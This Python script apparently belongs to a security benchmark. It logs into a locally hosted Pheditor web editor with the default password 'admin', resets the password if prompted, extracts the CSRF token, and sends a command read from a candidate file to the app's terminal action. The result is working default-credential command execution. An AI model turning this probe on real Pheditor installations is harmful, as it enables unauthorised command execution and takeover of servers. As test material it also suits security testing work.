#!/usr/bin/env python3
"""Pheditor terminal probe: login + CSRF + POST action=terminal against the real app.

Usage: python3 seed_exec.py <candidate.json> [version]

BASE is http://127.0.0.1:<port>/pheditor so login and POST hit /pheditor/pheditor.php.
PCB_TARGET_PORT remaps only the host port and keeps the /pheditor path.
PCB_TARGET_BASE, if set, is used as-is (verify.sh appends /pheditor).
"""
from __future__ import annotations

import json
import os
import re
import sys
import urllib.error
import urllib.parse
import urllib.request
from http.cookiejar import CookieJar
from urllib.parse import urlparse, urlunparse

PHEDITOR_PASSWORD = "admin"
APP_PATH = "/pheditor"

BASE = {
    "v0": "http://127.0.0.1:38400/pheditor",
    "v1": "http://127.0.0.1:38401/pheditor",
    "v2": "http://127.0.0.1:38402/pheditor",
}


def _with_app_path(url: str) -> str:
    b = (url or "").rstrip("/")
    if not b:
        return b
    if not b.endswith(APP_PATH):
        b = b + APP_PATH
    return b


def resolve_base(version: str) -> str:
    env_base = os.environ.get("PCB_TARGET_BASE")
    if env_base:
        return _with_app_path(env_base)
    base = BASE.get(version, BASE["v1"])
    port = os.environ.get("PCB_TARGET_PORT")
    if port:
        p = urlparse(base)
        host = p.hostname or "127.0.0.1"
        path = p.path if p.path else APP_PATH
        if not path.rstrip("/").endswith(APP_PATH):
            path = APP_PATH
        base = urlunparse((p.scheme or "http", f"{host}:{int(port)}", path, "", "", ""))
    return base.rstrip("/")


def _opener():
    jar = CookieJar()
    return urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))


def _request(opener, url, data=None, timeout=15):
    body = urllib.parse.urlencode(data).encode() if data is not None else None
    req = urllib.request.Request(url, data=body)
    if body is not None:
        req.add_header("Content-Type", "application/x-www-form-urlencoded")
    try:
        with opener.open(req, timeout=timeout) as resp:
            return resp.getcode(), resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as e:  # noqa: BLE001
        return -1, str(e)


def _get_session(base_url: str, timeout: int = 10):
    opener = _opener()
    php = f"{base_url}/pheditor.php"
    st, text = _request(opener, php, {"pheditor_password": PHEDITOR_PASSWORD}, timeout=timeout)
    if st < 0:
        raise RuntimeError(f"login failed talking to {php}: {text}")
    if "pheditor_new_password" in text:
        new_pass = "BenchTest1234"
        _request(
            opener,
            php,
            {
                "pheditor_password": PHEDITOR_PASSWORD,
                "pheditor_new_password": new_pass,
                "pheditor_confirm_password": new_pass,
            },
            timeout=timeout,
        )
        _request(opener, php, {"pheditor_password": new_pass}, timeout=timeout)
    st, page = _request(opener, php, timeout=timeout)
    if st < 0:
        raise RuntimeError(f"could not load {php}: {page}")
    m = re.search(r'token\s*=\s*"([0-9a-f]+)"', page)
    if not m:
        raise RuntimeError(f"Could not extract CSRF token from {php} (status={st})")
    return opener, m.group(1)


def run_probe(candidate, *, version="v1"):
    base = resolve_base(version)
    if isinstance(candidate, dict):
        cmd = candidate.get("command") or candidate.get("payload") or candidate.get("path") or ""
    else:
        cmd = str(candidate)
    opener, token = _get_session(base)
    st, body = _request(
        opener,
        f"{base}/pheditor.php",
        {
            "action": "terminal",
            "command": cmd,
            "dir": "",
            "token": token,
        },
        timeout=15,
    )
    if st < 0:
        raise RuntimeError(f"terminal POST failed: {body}")
    return {
        "version": version,
        "command": cmd,
        "status_code": st,
        "body": body,
    }


if __name__ == "__main__":
    cand = json.load(open(sys.argv[1], encoding="utf-8"))
    version = sys.argv[2] if len(sys.argv) > 2 else "v1"
    r = run_probe(cand, version=version)
    print(json.dumps(r, default=str))
